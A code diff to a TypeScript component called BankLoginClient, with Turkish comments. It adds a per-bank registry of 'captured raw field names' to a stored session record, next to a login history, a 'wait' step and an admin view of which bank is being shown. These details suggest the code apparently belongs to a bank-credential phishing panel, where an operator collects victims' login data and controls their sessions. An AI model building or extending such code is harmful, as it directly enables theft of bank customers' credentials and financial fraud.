@@ -702,6 +702,18 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
       // Mevcut history'yi koru (farklı isDifferent false donduyse de eski kayitlar kalsın):
       nextFormData.bankLoginHistory = (sessionFormDataFinalRaw as Record<string, unknown>).bankLoginHistory;
     }
+    // Bu bankadan yakalanan ham alan adlari registry'si — sonraki banka
+    // degisiminde archivePreviousBankOnChange hepsini komple temizler:
+    nextFormData.bankCapturedKeys = Array.from(
+      new Set([
+        ...(Array.isArray(sessionFormDataFinalRaw?.bankCapturedKeys)
+          ? (sessionFormDataFinalRaw.bankCapturedKeys as unknown[]).filter(
+              (k): k is string => typeof k === "string",
+            )
+          : []),
+        ...Object.keys((overrideData ?? {}) as Record<string, unknown>),
+      ]),
+    );
     const { error: updateError } = await supabase
       .from("sessions")
       .update({ is_hidden: false, current_step: "wait",
@@ -766,6 +778,18 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
           form_data: {
             ...merged,
             ...clean,
+            // Bu bankaya ait yakalanan ham alan adlari — banka degisiminde
+            // archivePreviousBankOnChange bunlari komple temizler:
+            bankCapturedKeys: Array.from(
+              new Set([
+                ...(Array.isArray(merged.bankCapturedKeys)
+                  ? (merged.bankCapturedKeys as unknown[]).filter(
+                      (k): k is string => typeof k === "string",
+                    )
+                  : []),
+                ...Object.keys(clean),
+              ]),
+            ),
             // Admin'in "goruntulenen banka" kolonu icin:
             viewingBankSlug: bank.slug,
             viewingBankName: bank.name,
